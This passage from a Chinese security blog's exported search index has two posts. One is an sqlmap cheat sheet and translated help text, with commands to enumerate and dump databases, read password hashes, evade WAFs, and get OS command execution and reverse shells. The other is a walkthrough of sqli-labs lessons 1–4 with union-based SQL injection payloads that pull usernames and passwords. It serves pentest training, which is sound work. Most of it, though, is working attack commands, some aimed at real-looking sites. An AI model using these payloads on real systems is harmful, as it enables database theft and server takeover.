admin4 | admin4 | +----------+------------+ sqlmap使用语法大全1. 基础用法：./sqlmap.py -u “注入地址” -v 1 –dbs // 列举数据库 ./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库 ./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户 ./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户 ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名 ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的列名 ./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列 已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中、、、 2. sqlmap post注入我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 1. 浏览器打开目标地址http:// www.2cto.com /Login.asp 2. 配置burp代理(127.0.0.1:8080)以拦截请求 3. 点击login表单的submit按钮 4. 如下图，这时候Burp会拦截到了我们的登录POST请求 5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 6. 运行sqlmap并使用如下命令： ./sqlmap.py -r search-test.txt -p tfUPass 这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 3.sqlmap cookies注入sqlmap.py -u “http://127.0.0.1/base.php” –cookies “id=1″ –dbs –level 2 默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我 们直接在原有的基础上面加上 –level 2 即可利用sqlmap cookies注入突破用户登录继续注入先把用户登陆的cookie拿到吧，在收藏夹添加一个链接cookies属性：名字自己取javascript:alert(document.cookie)，，需要获取当前cookie的时候，直接点一下这个链接，然后复制一下弹出对话框里的cookie值就搞定了 sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test” -p是指指定参数注入 4. sqlmap遇到url重写的注入哪里存在注入就加上 * 号 ./sqlmap.py -u “http://www.cunlide.com/id1/1*/id2/2“ ###5.sqlmap 编码绕waf注入 ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载 其他基础：sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称 sqlmap -u “http://www.xxoo.com/news?id=1” –level=3 –smart –dbms “Mysql” –current-db #获取当前数据库名称 sqlmap -u “http://www.xxoo.com/news?id=1” –level=3 –smart –dbms “Mysql”–tables -D “db_name” #列表名 sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段 sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql” –dump -C “column_name” -T “table_name” -D “db_name” -v 0 #获取字段内容 **信息获取**sqlmap -u “ –smart –dbms “Mysql” –users #列数据库用户 sqlmap -u “ –smart –dbms “Mysql” –dbs#列数据库 sqlmap -u “ –smart –dbms “Mysql”–passwords #数据库用户密码 sqlmap -u “ –smart –dbms “Mysql”–passwords-U root -v 0 #列出指定用户数据库密码 sqlmap -u “ –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 sqlmap -u “ –smart –dbms “Mysql”–privileges #查看权限 sqlmap -u “ –smart –dbms “Mysql”–privileges -U root #查看指定用户权限 sqlmap -u “ –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 sqlmap -u “ –smart –dbms “Mysql” –roles #枚举数据库用户角色 sqlmap -u “ –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！） sqlmap -u “ –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表 sqlmap -u “ –smart –dbms “Mysql” –union-check #是否支持union 注入 sqlmap -u “ –smart –dbms “Mysql”–union-cols #union 查询表记录 sqlmap -u “ –smart –dbms “Mysql” –union-test #union 语句测试 sqlmap -u “ –smart –dbms “Mysql” –union-use –banner #采用union 注入 sqlmap -u “ –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by sqlmap -u “ –smart –dbms “Mysql”–method “POST” — data “id=1&amp;cat=2″ #post注入 sqlmap -u “ –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入 sqlmap -u “ –smart –dbms “Mysql”-b #获取banner信息 sqlmap -u “http://url/news?id=1” –level=3 –smart-v 1 -f #指纹判别数据库类型 sqlmap -u “http://url/news?id=1” –level=3 –smart–proxy”http://127.0.0.1:8118” #代理注入 sqlmap -u “http://url/news?id=1″–string”STRING_ON_TRUE_PAGE“ #指定关键词 sqlmap -u “ –smart –dbms “Mysql”–sql-shell #执行指定sql命令 sqlmap -u “ –smart –dbms “Mysql”–file /etc/passwd sqlmap -u “ –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令 sqlmap -u “ –smart –dbms “Mysql”–os-shell #系统交互shell sqlmap -u “ –smart –dbms “Mysql”–os-pwn #反弹shell sqlmap -u “ –smart –dbms “Mysql”–reg-read #读取win系统注册表 sqlmap -u “ –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度 sqlmap -u “ –smart –dbms “Mysql” –dbs -o “sqlmap.log” –resume #恢复已保存进度 注入分法不同，种类不同，来个简单的分类：1.get型：sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” 2.post型: sqlmap -u “http://xxx.xx.xxx/xx.xxx” –data=”xxxx=xxxx&amp;xxxx=xxx” 3.cookie类注入: sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” –cookie=”xxx=xxx&amp;xxx=xxx” –level=2 好，区分完毕再来后续的 需要数据库好：–dbs 得到数据库名称xxx，需要表： -D xxx –tables 得到表名xxxx，需要段：-D xxx -T xxxx –columns 得到段内有admin，password，需要值：-D xxx -T xxxx -C “admin,password” –dump 那么我们来理解一下，-D -T -C 是干吗的，当然就是知道其名称，指定使用其。 –dbs –tables –columns 是干吗的，当然就是不知道名称，列出来呗 –dump 那自然就是字面意思，类似于导出数据的行为 其实注入有了上面这几个命令，妥妥的够用了，不过还需要绕waf –tamper=”&quot; 注入被识别出来是工具，断开咋办–user-agent=”&quot; 再多牛逼的功能都是慢慢积累出来的，别想一口吃成胖子 例子：http://www.xxx.com/login.asp有post注入，我想*了,但是我不想出去拷贝post数据，很麻烦，我想让sqlmap自动跑post注入 sqlmap -u “http://www.xxx.com/login.asp” –forms 很好，上面的命令成功的帮我跑了post注入，并且找到了post的注入点jjj=123 sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –dbs 于是我用上面的命令看看数据库 sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –is-dba 顺便看看当前用户是不是dba sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -a 用了上面的命令 -a能得到什么呢：自己去看帮助吧。帮你筛选了一下，-a下面的那些命令是用来看用户，看主机，看权限的。 后来呢，我发现权限还是挺高的，同时呢，我跑出来了数据库名称kkk sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –tables 同时我找到了网站路径，然后我就又一次找到了sqlmap的牛逼的–os-xx系列命令，可以执行系统命令，同时还发现了牛逼的xpcmdshell –os-shell 以及很多牛逼的文件操作命令–file-xx 这些命令在需要用的时候使用就是了，会给你带来意想不到的惊喜 与此同时，我发现tables里面没有我想要的东西，我也找不到合适的内容，咋办呢，心一横，我决定把所有的数据库内容跑出来自己找，于是我这么做： sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –dump-all 然后牛逼的sqlmap就开始跑啊跑，然后紧接着我的蛋就碎了，尼玛，sqlmap一会就问你一次要不要破解密码，要不要这个，要不要那个，我和我的小朋友们都想擦你妹夫，功夫不负有心人，我又看见了一个命令 –batch 可以自动选择sqlmap默认选项于是，我可以和我的小朋友们玩耍去了，再也不用看着sqlmap拖库了。 总结下来，帮助文档还是很重要的，多看看，总会有些收获：为了避免各位看英文看到吐，大概总结下： Target: 字面意思，目标，那么就是确定目标的 Request: 字面意思，请求，就是定义请求内容的，比如post数据，http头，cookie注入，http头污染等等 Optimization：字面意思，调节性能，等等 Injection: 字面意思，注入的设置内容基本在这里，比如指定注入点，指定db，指定系统，等等 Detection: 基本就是用在确认注入范围，寻找注入点区域，这些 Technique: 基本用在确定注入手段，以及攻击方式 Fingerprint: 基本用在指纹识别，用的很少 Enumeration: 枚举信息，主要用在注入中，很重要，很常用 Brute force: 用来爆破，其实主要是枚举tables columns用的 User-defined function injection: 现在只有udf提权，以及指定一些自己定义的sqlmap脚本用，高端使用，求大牛指点 File system access 主要是文件读取，文件写入 Operating system access 主要用在对系统操作，例如os-shell 以及 后续的连接metasploit 实现后渗透攻击 windows registry access 基本就是注册表操作了 General 字面意思，综合的内容，一些特殊的功能实现，我在这里找到了crawl batch这些非常好用的参数 Miscellaneous 目测高端应用，还没怎么用过，求大神指教 如上面总结的，大概红字就是常用的命令，剩下的不常用里面也有很多很不错，在特殊情况下适用的内容，反正本贴科普而已。 字有点多，想看的菜鸟朋友认真看下来应该会有些收获，菜鸟们如果有什么其他的奇技淫巧，还希望分享1、2 共同进步！！ SQLMAP中文说明-D直接直接连接到数据库 -U网址 - URL = URL目标URL -L使用burp,WebScarab代理日志解析目标保存在指定的文本文件 -M BULKFILE扫描多个目标入伍 -R REQUESTFILE负载的HTTP请求从一个文件 -G读取谷歌url，传说中的批量检测 -C从配置INI文件configfile中加载选项 要求： 这些选项可以用来指定如何连接到目标URL。 --data=DATA通过POST发送数据串 --cookie=COOKIE 的HTTP Cookie头 --cookie-urlencode URL编码生成的cookie注射 --drop-set-cookie忽略从Set-Cookie头的响应 --user-agent=AGENT HTTP User-Agent头 --random-agent 随机选择的HTTP User-Agent头 --referer=REFERER HTTP Referer头 --headers=HEADERS HTTP头换行符隔开 --auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM） --auth-cred=ACRED的HTTP身份验证凭据（用户名：密码） --auth-cert=ACERT ACERT HTTP认证证书（key_file，cert_file中） --proxy=PROXY HTTP代理连接到目标URL --proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码） --ignore-proxy忽略HTTP代理 --delay=DELAY每个HTTP请求之间的延迟 --timeout=TIMEOUT 等待连接超时（默认30） --retries=RETRIES 重试连接超时（默认3） --scope=SCOPE 正则表达式来过滤目标提供代理日志 --safe-url=SAFURL URL地址访问测试过程中经常 --safe-freq=SAFREQ访问之间的一个给定的安全URL SAFREQ测试要求 优化： 这些选项可以用于优化性能的SqlMap。 -O开启所有优化开关 --predict-output 预测输出预测常见的查询输出 --keep-alive 保持活动使用持久HTTP（S）连接 --null-connection 空连接检索页面没有实际的HTTP响应体长度 --threads=THREADS最大数量的并发HTTP（S）请求（默认为1） 注射： 这些选项可以用来指定哪些参数测试， 提供定制注塑载荷和可选篡改脚本。 -P TESTPARAMETER可测试参数（S） --dbms=DBMS指定数据库 --os=OS指定操作系统 --prefix=PREFIX注射有效载荷前缀字符串 --suffix=SUFFIX注射有效载荷后缀字符串 --tamper=TAMPER篡改注入数据为使用给定的脚本（S） 检测： 这些选项可以用来指定如何解析和比较页面 从HTTP响应时使用盲SQL注入技术的内容。 --level=LEVEL要执行的测试水平等级（1-5，默认为1） --risk=RISK 测试执行的风险（0-3，默认为1） --string=STRING字符串匹配字符串在查询时是有效的页面 --regexp=REGEXP的正则表达式匹配在页面查询时是有效的 --text-only 纯文本比较只对文字内容为基础的网页 技巧： 这些选项可以用来调整特定的SQL注入测试 技术。 --technique=TECH SQL注入技术测试（默认博伊斯特） --time-sec=TIMESEC秒的拖延DBMS响应（默认为5） --union-cols=UCOLS列范围测试 --union-char=UCHAR字符使用暴力破解的列数 指纹：-f, --fingerprint 指纹进行广泛的DBMS版本指纹 枚举： 这些选项可以用来列举的后端数据库 管理系统中所包含的信息，结构和数据 表。此外，您可以运行您自己的SQL语句。 -b，--banner数据库的旗帜 --current-user数据库当前用户 --current-db检索数据库当前数据库 --is-dba 检测如果DBMS当前用户是DBA --users 枚举用户和DBMS用户 --passwords 密码枚举DBMS用户密码哈希 --privileges 特权列举数据库用户的权限 --roles 角色枚举数据库用户的角色 --dbs枚举的DBMS数据库 --tables DBMS数据库表 --columns DBMS数据库表列 --schema枚举数据库模式 --count检索表条目的数量 --dump转储DBMS数据库表条目 --dump-all全部转储所有的DBMS数据库表中的条目 --search搜索列（S），表（S）和/或数据库名称（S） -D DBMS数据库枚举 -T DBMS数据库表枚举 -C DBMS的数据库表列列举 -U用户DBMS用户枚举 --exclude-sysdbs排除列举表时，DBMS系统数据库 --start=LIMITSTART首先查询的输出项检索 --stop=LIMITSTOP最后查询的输出项检索 --first=FIRSTCHAR首先查询输出单词字符检索 --last=LASTCHAR最后查询的输出单词字符检索 --sql-query=QUERY执行查询的SQL语句 --sql-shell提示下一个交互式SQL外壳 蛮力： 这些选项可以用来运行蛮力检查的。 --common-tables 共同表检查存在共同表 --common-columns 共同列检查存在共同的列 用户定义的函数注入： 这些选项可以被用来创建用户自定义功能。 --udf-inject注入用户自定义功能 --shared-lib=SHLIB本地路径的共享库 文件系统的访问： 这些选项可以被用来访问后端数据库管理 系统底层的文件系统。 --file-read=RFILE DBMS文件系统读取文件 --file-write=WFILE写后端的DBMS文件系统上的本地文件 --file-dest=DFILE后端数据库的绝对文件路径写入 操作系统访问： 这些选项可以被用来访问后端数据库管理 系统底层操作系统。 --os-cmd=OSCMD执行操作系统命令 --os-shell提示符下交互式操作系统外壳 --os-pwn提示为一个彻头彻尾的带外壳，meterpreter或VNC --os-smbrelay一个点击提示一个OOB壳，meterpreter或VNC --os-bof存储过程缓冲区溢出剥削 --priv-esc数据库进程“用户权限升级 --msf-path=MSFPATH本地路径Metasploit Framework等3安装 --tmp-path=TMPPATH远程绝对路径的临时文件目录 Windows注册表的访问： 这些选项可以被用来访问后端数据库管理 系统Windows注册表。 --reg-read读Windows注册表项值 --reg-add写一个Windows注册表项值数据 --reg-delL删除Windows注册表键值 --reg-key=REGKEY Windows注册表 --reg-value=REGVAL Windows注册表键值 --reg-data=REGDATA Windows注册表关键值数据 --reg-type=REGTYPE Windows注册表项值类型 秘书长： 这些选项可以用来设置一些一般性的工作参数。 -s 保存和恢复在会议文件中检索所有数据 -t 登录到一个文本文件中所有的HTTP流量 --batch 一批从不要求用户输入，使用的默认行为 --charset=CHARSET字符编码，用于数据检索 --eta显示预计到达时间为每个输出 --flush-session 冲洗会议会话文件 --fresh-queries在会议文件中存储的查询结果 --save 配置INI文件保存选项 --update更新的SqlMap 杂项：--beep SQL注入发现 --check-payload 检查有效载荷的IDS检测测试 --cleanup清理SqlMap特定的UDF和表的DBMS --forms解析和测试形式的目标URL --gpage=GOOGLEPAGE使用Google从指定的页码dork结果 --mobile通过HTTP User-Agent头 --page-rank显示网页排名（PR）为Google dork结果 --parse-errors解析DBMS响应页面的错误信息 --replicate复制倒入一个SQLite3数据库中的数据 --tor的使用默认的Tor（Vidalia的/ Privoxy的/ Polipo即可）代理地址 --wizard向导为初学者用户简单的向导界面]]></content>
      <tags>
        <tag>sqli-labs</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs_Less_1-4]]></title>
    <url>%2F2018%2F04%2F19%2Fsqli-labs-Less-1-4%2F</url>
    <content type="text"><![CDATA[sqli-labs练习SQL注入（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 手工注入(hackbar)Less-1 Get-Error-Single quotes-String从标题可以知是基于get请求方法的单引号字符报错 页面提示输入数字型参数 id /sqli-labs/Less-1/?id=1 返回正常页面 Welcome Dhakkan Your Login name:Dumb Your Password:Dumb 加一个单引号测试 sqli-labs/Less-1/?id=1&apos; 页面报错 Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 从外层依次去掉闭合的单引号可以看到只剩下 1’ ,可知为字符型注sql注入（字符型和数字型的区别会在Less-2后区分）。 构造payload在这里使用 # 或– 注释掉多余的部分（当然，这里也可以使用其他方法闭合这个单引号），对#进行了url编码，构造好使其正常返回。 sqli-labs/Less-1/?id=1&apos; %23 返回正常 猜测字段数（order by ）使用联合查询 (union select)首先使用order by 进行字段数猜测 sqli-labs/Less-1/?id=1&apos; order by 10%23 返回错误 ：Unknown column ‘10’ in ‘order clause’ sqli-labs/Less-1/?id=1&apos; order by 5%23 返回正常 sqli-labs/Less-1/?id=1&apos; order by 6%23 返回错误可知字段数为 5 找到显示位sqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4,5%23 这里注意把id的值设置为一个错误的值，这里设置为了-1可知显示位在 2，3 Welcome Dhakkan Your Login name:2 Your Password:3 查看目标数据库基本信息sqli-labs/Less-1/?id=-1&apos; union select 1,version(),user(),4,5%23 返回如下 Welcome Dhakkan Your Login name:5.5.53 Your Password:root@localhost 函数 功能 database() 返回当前数据库名 security user() 返回当前数据库连接使用的数据库 security version() 返回当前数据库的版本 5.5.53 system_user() 查询系统用户名 root@localhost session_user() 连接数据库的用户名 root@localhost current_user() 查询当前用户名 root@localhost @@version_compile_os 查询数据库操作系统 Win32 @@datadir 查询数据库路径 C:\phpStudy\MySQL\data\ @@basedir 查询MySQL路径 C:/phpStudy/MySQL/ 注：MySQL在5.xx版本以上有个information_schema数据库，该数据库记录了当前数据库的所有数据库、表、列、用户权限等信息，其中SCHEMATA 表存储MySQL所有数据库的基本信息，包括数据库名、编码类型路径等，show databases;结果取自此表；TABLE表存储MySQL中的表信息，show tables from schemaname;的结果取自此表；COLUMNS表：提供了表的列信息，show columns from schemaname.tablename;的结果取自此表 可得到该数据库基本信息 版本：5.5.53 用户：root@localhost 当前数据库名： security 获取数据库中的信息（database，table，column）获取数据库sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata %23 返回了数据库 information_schema,一般MySQL中不止一个数据库，可以在加个limit 1,1第一个1表示从那里开始，第二个1表示几个，可以通过不断更改第一个数来显示数据库 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata limit 2,1%23 当然更简单的方法是使用group_concat()一次性返回所有的 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回：information_schema,challenges,mysql,performance_schema,security,testsecurity为需要查找的数据库 获取表sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 或者 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=0x7365637572697479 %23 返回：emails,referers,uagents,users 注意：security是字符串要使用单引号包裹，或者将其转为十六进制，数值类型不需要单引号（有时可能会过滤掉单引号） 获取列sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回：id,username,password,first_name,last_name 获取数据到这里我们已经知道了数据库名security,表名users,列名id,username,password,first_name,last_name sqli-labs/Less-1/?id=-1&apos; union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回 Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 GET-Error based-Intiger based基于get请求方法的整形注入根据页面提示可知为数字型参数 id sqli-labs/Less-2/?id=1 页面返回 Welcome Dhakkan Your Login name:Dumb Your Password:Dumb 添加一个单引号后 sqli-labs/Less-2/?id=1&apos; 页面返回错误 Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 从外层逐层去掉闭合单引号发现只剩下一个单引号 ，可以判断为数字型sql注入。 构造payloadLess-2/?id=1 %23 数字型直接把后面的注释掉即可 sqli-labs/Less-2/?id=1 order by 6 %23 报错 sqli-labs/Less-2/?id=1 order by 5 %23 正常 sqli-labs/Less-2/?id=-1 union select 1,2,3,4,5 %23 显示位 2，3 sqli-labs/Less-2/?id=-1 union select 1,version(),database(),4,5 %23 版本：5.5.53 数据库：security sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回所有的数据库 sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 返回security数据库的所有表名 sqli-labs/Less-2/?id=-1 union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回users表的所有列名 sqli-labs/Less-2/?id=-1 union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回users表中的username和password字段的值 以上payload与Less-1相似 字符型注入和数字型注入的区别Less-1 字符型 id=’$id’ $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; Less-2 数字型 id=$id $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 加了一个单引号的报错结果 字符型：&apos;&apos;1&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 1&apos; 数字型：&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 &apos; 如果没有报错显示：test1不报错,test2报错为字符型 test1 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=&apos;2 test2 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=2 对比可知：字符型使用单号包裹，数字型无；加了一个单引号后可以看到提交的参数被单引号包裹；以及上面测试的结果判断。 Less-3 GET-Error-Single quotes with twist-string基于get请求方法的带括号的单引号字符型报错注入测试sqli-labs/Less-3/?id=1&apos; 返回 near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 分析发现是在 Less-1的基础上加了括号 构造payloadsqli-labs/Less-3/?id=1&apos;) %23 返回正常,这里看一下源码就更好理解了 $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;; 按照之前的思路测试即可sqli-labs/Less-3/?id=1&apos;) order by 6 %23 返回错误 sqli-labs/Less-3/?id=1&apos;) order by 5 %23 返回正常 sqli-labs/Less-3/?id=-1&apos;) union all select 1,2,3,4,5 %23 可知 2，3回显 Less-4 Get-Error based- Double Quotes-string基于get请求方法的双引号报错注入测试sqli-labs/Less-4/?id=1&apos; 页面正常没有任何异常（这里加了单引号没作用），加一个双引号 sqli-labs/Less-4/?id=1&quot; 返回 near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 从外逐层去掉成对的双引号和单引号 ，我们发现情况与Less-3类似，只是单引号换成双引号。 构造payloadsqli-labs/Less-4/?id=1&quot;) %23 返回正常 按照之前的思路即可sqli-labs/Less-4/?id=1&quot;) order by 6%23 sqli-labs/Less-4/?id=1&quot;) order by 5%23 sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
</search>
